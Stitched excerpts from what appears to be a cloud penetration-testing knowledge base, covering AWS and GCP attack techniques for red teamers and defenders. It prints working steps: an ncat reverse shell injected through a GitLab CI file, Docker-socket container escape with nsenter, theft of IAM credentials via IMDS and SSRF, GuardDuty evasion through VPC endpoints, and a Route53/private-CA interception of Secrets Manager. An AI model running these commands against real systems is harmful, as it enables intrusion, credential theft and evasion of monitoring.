This can allow you to execute AWS API calls within the victim's account, however, it comes with a risk. If you were to try to use those credentials outside of that host (for example, from your laptop) an alert would be triggered. There is a GuardDuty finding which detects when IAM credentials are being used outside of EC2 called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS.</p> <p>To get around this alert being triggered, attackers could use the stolen credentials from the attacker's EC2 instance. The alert only detected if the credentials were used outside of EC2, not the victim's specific EC2 instance. So by using their own, or exploiting another EC2 instance, attackers could bypass the GuardDuty alert.</p> <p>On January 20th 2022, AWS released a new GuardDuty finding called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS. This new finding addressed the shortcomings of the previous one. Now, when IAM credentials are used from ANY EC2 instance, if those credentials don't belong to the same account as the EC2 instance which generated them, it triggers the alert. Thus, simply using your own EC2 instance is no longer viable. This addresses a long standing concern within the cloud security community.</p> <p>However, there is currently a functioning bypass for this - VPC Endpoints. Using VPC Endpoints will not trigger the GuardDuty alert. What this means is that, as an attacker, <code>if you steal IAM credentials from an EC2 instance, you can use those credentials from your own EC2 instance while routing traffic through VPC Endpoints. This will not trigger the GuardDuty finding</code>.</p> <p>Note</p> <p>There is another bypass option, however, it would only be useful in niche scenarios. The InstanceCredentialExfiltration finding is only tied to the AWS account, not the EC2 instance. As a result, if you compromise an EC2 instance in the target account and then compromise OTHER EC2 instances in the account, or steal their IAM credentials, you can safely use them from the initially compromised instance without fear of triggering GuardDuty.</p>"},{"location":"aws/avoiding-detection/steal-keys-undetected/#sneakyendpoints","title":"SneakyEndpoints","text":"<p>To make this setup faster/easier for Penetration Testers and Red Teamers, SneakyEndpoints was created.

Perhaps this will give us a hint for something we can exploit.</p> <p>Navigate to the mvp-docker project's Issues page.</p> <p></p> <p>This is interesting for a few reasons. Most notably, Ashley wants some help with building a Docker container as a part of the CI/CD pipeline. She also mentions a gitlab-ci.yml file, which is the configuration for the GitLab CI/CD pipeline.</p> <p>Building Docker images as a part of a CI/CD pipeline can have serious security implications and this is definitely worth looking into.</p> <p>Before we can get to that fun, let's take a look at that gitlab-ci.yml file. Navigate there and make some changes (you can edit the file through the web browser if you prefer or you can clone the project locally).</p> <p></p> <p>After committing changes (via the web interface or otherwise) you can navigate to the <code>CI/CD</code> tab on the left to see the pipeline execute.</p> <p>Clicking on the status, and then the build job we can see the output.</p> <p></p> <p>This can tell us a few things that are very useful to us as attackers. First, on line 3, we see that the CI/CD pipeline is using the \"docker\" executor, meaning everything executes inside a Docker container somewhere. On line 6, we see that it is using an Ubuntu Docker image. And lines 20+ show us that our input is executing in this environment.</p> <p>This looks like a fantastic place to start.</p> <p>Getting a Reverse Shell</p> <p>Our next step will be to get a shell in this environment. This is where our attackbox can come in.</p> <p>Please note: You are welcome to use your C2 platform of choice (If you'd like a recommendation, I'm a fan of Mythic). For this walkthrough I will use netcat for simplicity.</p> <p>SSH into your attack box and install a tool called <code>ncat</code>.</p> <p></p> <p>Now, we can setup a listener (from the attackbox) with the following command.</p> <pre><code>sudo ncat -l 443 --ssl -v\n</code></pre> <p>We can now go back and edit the gitlab-ci.yml file to send a reverse shell. Using Ncat it's as easy as adding the following lines. From our previous foray we know this is an Ubuntu Docker container, and thus, we can use the apt package manager.</p> <pre><code>apt update\napt install -y ncat\nncat &lt;attackbox_ip&gt; 443 --ssl -e /bin/bash -v\n</code></pre> <p></p> <p>Now click \"Commit changes\" and watch that pipeline run.</p> <p>You are now the proud owner of a reverse shell inside this Docker container.</p> <p></p> <p>Docker Socket</p> <p>From here, there are a number of things we could try to do. Your first instinct may be, \"I'm on an EC2 instance, can I reach the metadata service?\". That's a great idea! Unfortunately you can't.</p> <p>The bright folks over at SoftHouseIO use IMDSv2, one of the benefits of which is that Docker containers cannot reach it by default.</p> <pre><code>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to \"1\". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.\n</code></pre> <p>That's a bummer. Other options? Try and pivot off this machine to something else in the VPC? Access a service exposed internally to the host (172.17.0.1)? Escape the container?</p> <p>That last one might get us somewhere. Ashley mentioned having some issues about building a Docker container in the pipeline. To do that, wouldn't they have to use something like kaniko? What if they just exposed the Docker socket instead?</p> <p>When a Docker socket is exposed inside a container, it can have dangerous consequences as an attacker can potentially escape the container and escalate privileges on the host.</p> <p>The common location for the socket is at <code>/var/run/docker.sock</code>, let's go look for it.</p> <p></p> <p>There we go! They did mount the Docker socket! Let's use this to escape the container.</p> <p>Escaping the Container</p> <p>Note: There are many different ways you could abuse this to escape the container. I will walk through what I think is the simplest.</p> <p>First let's install two tools that will make things easier for ourselves.</p> <pre><code>apt update\napt install -y python3 docker.io\n</code></pre> <p>Python3 will help us to spawn a <code>tty</code> and having the Docker binary will make it easier to interact with the Docker socket. We could alternatively use curl.</p> <p>With those two tools installed, let's spawn a <code>tty</code> with the classic Python one-liner.</p> <pre><code>python3 -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre> <p></p> <p>Doesn't that looks so much better? We have an actual shell prompt now. This will be useful for interacting with the Docker socket. Speaking of which, let's see which Docker containers are running on the host.</p> <pre><code>docker ps\n</code></pre> <p>This output lets us know that everything is working as intended. With access to the Docker socket, let's escape by creating a privileged Docker container (Note: There are a number of options to do this).</p> <pre><code>docker run -it --rm --pid=host --privileged ubuntu bash\n</code></pre> <p>Now, inside our new privileged container, let's migrate to the namespace of a process running on the host.</p> <pre><code>nsenter --target 1 --mount --uts --ipc --net --pid -- bash\n</code></pre> <p></p> <p>How fun is that?! We now have root on the underlying host and have escaped the container.</p> <p>Escalating</p> <p>With root on the host, we have a number of options for next steps. We can steal IAM credentials from the metadata service, brute force our IAM permissions, enumerate roles in the account to find out what services are running in the account, attempt to escalate IAM privileges, maybe try to intercept the SSM agent if it's running on the box? One place we should check before doing all that is the user data.</p> <p>User data is used to run commands when an EC2 instance is first started or after it is rebooted (with the right configuration). This can be very helpful to determine what software is installed on the machine, and it can also potentially be a source of credentials from developers who aren't very careful.</p> <p>Let's check this (remember we are using IMDSv2).</p> <pre><code>TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data/\n</code></pre> <p></p> <p>On first glance it appears pretty standard; It installs GitLab, installs the GitLab runners, activates them, etc.</p> <p>There is a slight problem though, on the line where they installed GitLab, they accidentally leaked a credential. An important one at that. That is the credential to the root user of GitLab.</p> <p>This is bad news for SoftHouseIO and great news for us. Let's use this to log into the GitLab web UI as an administrator (username: root, password: &lt;what's in the useradata&gt;)</p> <p>After exploring around for a little while, you may stumble into the the <code>infra-deployer</code> project. That sounds important.</p> <p></p> <p>\"Admin IAM Credentials are being stored in environment variables to be used with the GitLab runners\". That sounds.....very interesting. The good news is that as an administrator, we can see those variables. Navigate to the <code>Settings</code> tab on the left and then click <code>CI/CD</code>. Next, click <code>Expand</code> on the <code>Variables</code> section.</p> <p></p> <p>An Access Key and a Secret Access Key!

Quiet Riot offers a scalable method for enumerating each of these items with configurable wordlists per item type. Furthermore - it also allows you to enumerate Azure Active Directory and Google Workspace valid email addresses - which can then be used to test for valid Root User accounts in AWS, assuming that the email address is the same.</p> <p>Ultimately, if you want to perform these techniques at scale - Quiet Riot is your best bet, but if you want to do it manually, you can a number of ways to do so. Another way to enumerate IAM principals would be to use S3 Bucket Policies. Take the following example:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Example permissions\",\n            \"Effect\": \"Deny\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::123456789123:role/role_name\"\n            },\n            \"Action\": \"s3:ListBucket\",\n            \"Resource\": \"arn:aws:s3:::*bucket you own*\"\n        }\n    ]\n}\n</code></pre> <p>You would apply this policy to a bucket you own. By specifying a principal in the target account (123456789123), you can determine if that principals exists. If setting the bucket policy succeeds you know the role exists. If it fails you know the role does not.</p> <p>There are a few ways to do this, for example, Pacu's module will attempt to change the AssumeRole policy of a role in your account and specify a role in another account. If the role exists, the policy will be updated and no error will be returned. If the role does not exist, the policy will not be updated and instead return an error.</p> <p>Warning</p> <p>Doing either of these techniques will generate a lot of CloudTrail events, specifically UpdateAssumeRolePolicy or PutBucketPolicy in your account. If your intention is to be stealthy it is not advised (or required) to use a target's credentials. Instead you should use your own account (the CloudTrail events will be generated there).</p> <p>Note</p> <p>While this works for both IAM users and roles, this will also work with service-linked roles. This will allow you to enumerate various services the account uses, such as GuardDuty or Organizations.</p> <p>Another method uses the AWS Console. Based on error responses from the AWS Console it is possible to determine if a given email address belongs to the root user of an AWS account.</p> <p>From the AWS Console, ensure the <code>Root user</code> radio button is selected and enter an email address that you suspect owns an AWS account. </p> <p>If that email address is valid, you will be prompted to enter a password.

To mitigate the risks of this for your organization, it would be beneficial to enforce IMDSv2 for all EC2 instances which has additional security benefits. IMDSv2 would significantly reduce the risk of an adversary stealing IAM credentials via SSRF or XXE attacks.</p> <p>One of the most common techniques in AWS exploitation is abusing the Instance Metadata Service (IMDS) associated with a target EC2 instance.</p> <p>Most EC2 instances can access their IMDS at 169.254.169.254. This service is only accessible from the specific EC2 instance it is associated with. The instance metadata service contains useful information about the instance, such as its IP address, its instance type, the name of the security groups associated with it, etc.</p> <p>If an EC2 instance has an IAM role attached to it, IAM credentials associated with that role can be retrieved from the metadata service. Because of this, attackers will frequently target the IMDS to steal those credentials.</p>"},{"location":"aws/exploitation/ec2-metadata-ssrf/#stealing-iam-credentials-from-the-instance-metadata-service","title":"Stealing IAM Credentials from the Instance Metadata Service","text":"<p>If the EC2 instance is configured to use the default instance metadata service version 1, it is possible to steal IAM credentials from the instance without getting code execution on it.</p> <p>This can be done by abusing existing applications running on the host. By exploiting common vulnerabilities such as server side request forgery (SSRF) or XML external entity (XXE) flaws, an adversary can coerce an application running on the host to retrieve those IAM credentials.</p> <p>To demonstrate this, in the following example there is a web server running on port 80 of the EC2 instance. This web server has a simple SSRF vulnerability, allowing us to make GET requests to arbitrary addresses. We can leverage this to make a request to <code>http://169.254.169.254</code>.</p> <p></p> <p>To determine if the EC2 instance has an IAM role associated with it, we can make a request to <code>http://169.254.169.254/latest/meta-data/iam/</code>. A 404 response indicates there is no IAM role associated. You may also get a 200 response that is empty, this indicates that there was an IAM Role however it has since been revoked.</p> <p>If there is a valid role we can steal, we can make a request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. This will return the name of the IAM role associated with the credentials. In the example below we see that the role name is 'ec2-default-ssm'.</p> <p></p> <p>To retrieve the credentials, we can append the role name to the previous query. For example, with the role name shown previously, the query would be <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/</code>.</p> <p></p> <p>These credentials can then be used in the AWS CLI to make calls to the API. To learn more about using stolen IAM credentials, check out this comprehensive guide.</p> <p>Note</p> <p>An adversary who has gained code execution on the EC2 instance can retrieve credentials from the IMDS regardless of the version being used.

The following creates the private hosted zone for secretsmanager.us-east-1.amazonaws.com: <pre><code>aws route53 create-hosted-zone --name secretsmanager.us-east-1.amazonaws.com --caller-reference sm4 --hosted-zone-config PrivateZone=true --vpc VPCRegion=us-east-1,VPCId=&lt;VPCId&gt;\n</code></pre></p> <p>Then set the A record for secretsmanager.us-east-1.amazonaws.com in this private hosted zone. Use the following POST body payload - mitm.json:</p> <pre><code>{\n  \"Comment\": \"&lt;anything&gt;\",\n  \"Changes\": [{\n    \"Action\": \"UPSERT\",\n    \"ResourceRecordSet\": {\n      \"Name\": \"secretsmanager.us-east-1.amazonaws.com\",\n      \"Type\": \"A\",\n      \"TTL\": 0,\n      \"ResourceRecords\": [{\"Value\": \"&lt;ip_of_adversary_instance_in_the_VPC&gt;\"}]\n    }\n  }]\n}\n</code></pre> <p>One set TTL to 0 to avoid DNS caching. Then, the advisory uses this payload to change-resource-record-sets: <pre><code>aws route53 change-resource-record-sets --hosted-zone-id &lt;id_returned_by_previous_API_call&gt; --change-batch file://mitm.json\n</code></pre></p> <p>Now, the adversary must generate the CSR and send it for signing to the ACM-PCA, CSR and private key can be generated with OpenSSL: <pre><code>openssl req -new -newkey rsa:2048 -nodes -keyout your_domain.key -out your_domain.csr\n</code></pre></p> <p>For CN (Common Name), one must provide secretsmanager.us-east-1.amazonaws.com. Then one sends the CSR to acm-pca to issue the certificate: <pre><code>aws acm-pca issue-certificate --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\" --csr file://your_domain.csr --signing-algorithm SHA256WITHRSA --validity Value=365,Type=\"DAYS\" --idempotency-token 1234\n</code></pre></p> <p>It returns the signed certificate ARN in the response. The next call is to fetch the certificate.</p> <pre><code>aws acm-pca get-certificate --certificate-arn \"&lt;cert_arn_from_previous_response&gt;\" --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\"\n</code></pre> <p>Once one got the signed certificate on the disk as cert.crt, the adversary starts the listener or 443/TCP and sniffs the calls to the secretsmanager.us-east-1.amazonaws.com <pre><code>sudo ncat --listen -p 443 --ssl --ssl-cert cert.crt --ssl-key your_domain.key -v\n</code></pre></p> <p>The calls can be then forwarded to the Secrets Manager VPCE to for example GetSecretValue and get unauthorized access to the data. The same action can be done with any AWS API called from the VPC - S3, KMS, etc.</p>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/","title":"Exfiltrating S3 Data with Bucket Replication Policies","text":"<ul> <li> <p> Additional Resources</p> <p>Data exfiltration with native AWS S3 features by Ben Leembnruggen</p> </li> </ul>"},{"location":"aws/exploitation/s3-bucket-replication-exfiltration/#introduction","title":"Introduction","text":"<p>S3 data replication provides the ability to copy objects to another bucket, which can be useful from an enterprise logging, integration or security perspective.

This allows the security groups to track information about the network traffic and allow/deny that traffic based on the Security Group rules.</p> <p>There are two kinds of traffic flows; tracked and untracked. For example the AWS documentation mentions a tracked flow as the following, \"if you initiate an ICMP ping command to your instance from your home computer, and your inbound security group rules allow ICMP traffic, information about the connection (including the port information) is tracked. Response traffic from the instance for the ping command is not tracked as a new request, but rather as an established connection and is allowed to flow out of the instance, even if your outbound security group rules restrict outbound ICMP traffic\".</p> <p>An interesting side effect of this is that tracked connections are allowed to persist, even after a Security Group rule change. </p> <p>Let's take a simple example: There is an EC2 instance that runs a web application. This EC2 instance has a simple Security Group that allows SSH, port 80, and port 443 inbound, and allows all traffic outbound. This EC2 instance is in a public subnet and is internet facing.</p> <p></p> <p>While performing a penetration test you've gained command execution on this EC2 instance. In doing so, you pop a simple reverse shell. You work your magic on the box before eventually triggering an alert to our friendly neighborhood defender. They follow their runbooks which may borrow from the official AWS whitepaper on incident response. </p> <p>As part of the \"Isolate\" step, the typical goal is to isolate the affected EC2 instance with either a restrictive Security Group or an explicit Deny NACL. The slight problem with this is that NACLs affect the entire subnet, and if you are operating in a space with a ton of EC2 instances the defender is unlikely to want to cause an outage for all of them. As a result, swapping the Security Group is the recommended procedure.</p> <p>The defender switches the Security Group from the web and ssh one, to one that does not allow anything inbound or outbound.</p> <p></p> <p>The beauty of connection tracking is that because you've already established a connection with your shell, it will persist. So long as you ran the shell before the SG change, you can continue scouring the box and looking for other vulnerabilities.</p> <p></p> <p>To be clear, if the restrictive security group doesn't allow for any outbound rules we won't be able to communicate out (and if you're using a beaconing C2 that will not function).</p> <p></p>"},{"location":"aws/general-knowledge/iam-key-identifiers/","title":"IAM ID Identifiers","text":"<ul> <li> <p> Additional Resources</p> <p>Reference: AWS Documentation: Unique Identifiers</p> </li> </ul> <p>In AWS, different resources are assigned a \"unique identifier\".

This includes resources like:</p> <ul> <li>Organizations</li> <li>Folders</li> <li>Projects</li> <li>Compute Instances</li> <li>Cloud Functions</li> </ul> <p>In MOST cases, the general psuedo-code is the same regardless of the resource. However, the permissions allowed are usually dependent on the resource. </p> <p>For example, for \"Projects\" (probably 99% of people's interest), testIamPermissions is documented here. Note the general pattern is passing in an array (or list) of individual permissions and the service will return the list of permissions the caller is allowed in that specific project. So in the example below, we pass in a large number of permissions and maybe just \"cloudfunctions.functions.list\" is returned indicating our caller has that permission within this project (aka, can list all cloud functions in this project).</p> <pre><code># Input\n{\n  \"permissions\": [\n    compute.instances.addAccessConfig\n    cloudfunctions.functions.list\n    etc\n  ]\n}\n\n# Output\n{\n  \"permissions\": [\n     cloudfunctions.functions.list\n  ]\n}\n</code></pre> <p>However, testIamPermissions does NOT just exist for projects. The compute service allows you to specify permissions at the compute instance level (as opposed to the project level). As such, testIamPermissions actually exists for instances as well shown in the documentation here. You'll notice the API call is pretty much the same as the projects API call in that it takes in a big list of permission and returns the list of permissions the caller has on THAT specific instance; we are just calling testIamPermissions on the instance as opposed to the project. Also note we could not pass in \"cloudfunctions.functions.list\", for example, to the instances testIamPermissions as it will only accept instance-level permissions.</p> <pre><code># Input\n{\n  \"permissions\": [\n                'compute.instances.addAccessConfig',\n                'compute.instances.addMaintenancePolicies',\n                'compute.instances.addResourcePolicies',\n                'compute.instances.attachDisk',\n                'compute.instances.createTagBinding',\n                'compute.instances.delete',\n                'compute.instances.deleteAccessConfig',\n                'compute.instances.deleteTagBinding',\n                'compute.instances.detachDisk',\n                'compute.instances.get',\n                'compute.instances.getEffectiveFirewalls',\n                'compute.instances.getGuestAttributes',\n                'compute.instances.getIamPolicy',\n                'compute.instances.getScreenshot',\n                'compute.instances.getSerialPortOutput',\n                'compute.instances.getShieldedInstanceIdentity',\n                'compute.instances.getShieldedVmIdentity',\n                'compute.instances.listEffectiveTags',\n                'compute.instances.listReferrers',\n                'compute.instances.listTagBindings',\n                'compute.instances.osAdminLogin',\n                'compute.instances.osLogin',\n                'compute.instances.removeMaintenancePolicies',\n                'compute.instances.removeResourcePolicies',\n                'compute.instances.reset',\n                'compute.instances.resume',\n                'compute.instances.sendDiagnosticInterrupt',\n                'compute.instances.setDeletionProtection',\n                'compute.instances.setDiskAutoDelete',\n                'compute.instances.setIamPolicy',\n                'compute.instances.setLabels',\n                'compute.instances.setMachineResources',\n                'compute.instances.setMachineType',\n                'compute.instances.setMetadata',\n                'compute.instances.setMinCpuPlatform',\n                'compute.instances.setName',\n                'compute.instances.setScheduling',\n                'compute.instances.setSecurityPolicy',\n                'compute.instances.setServiceAccount',\n                'compute.instances.setShieldedInstanceIntegrityPolicy',\n                'compute.instances.setShieldedVmIntegrityPolicy',\n                'compute.instances.setTags',\n                'compute.instances.simulateMaintenanceEvent',\n                'compute.instances.start',\n                'compute.instances.startWithEncryptionKey',\n                'compute.instances.stop',\n                'compute.instances.suspend',\n                'compute.instances.update',\n                'compute.instances.updateAccessConfig',\n                'compute.instances.updateDisplayDevice',\n                'compute.instances.updateNetworkInterface',\n                'compute.instances.updateSecurity',\n                'compute.instances.updateShieldedInstanceConfig',\n                'compute.instances.updateShieldedVmConfig',\n                'compute.instances.use',\n                'compute.instances.useReadOnly'\n  ]\n}\n\n# Output\n{\n  \"permissions\": [\n                'compute.instances.start',\n                'compute.instances.startWithEncryptionKey',\n                'compute.instances.stop',\n  ]\n}\n</code></pre>"},{"location":"gcp/enumeration/enumerate_all_permissions/#gcpwn-introduction","title":"GCPwn Introduction","text":"<p>gcpwn is a tool that will run testIamPermission on all resources identified if specified by the end user.
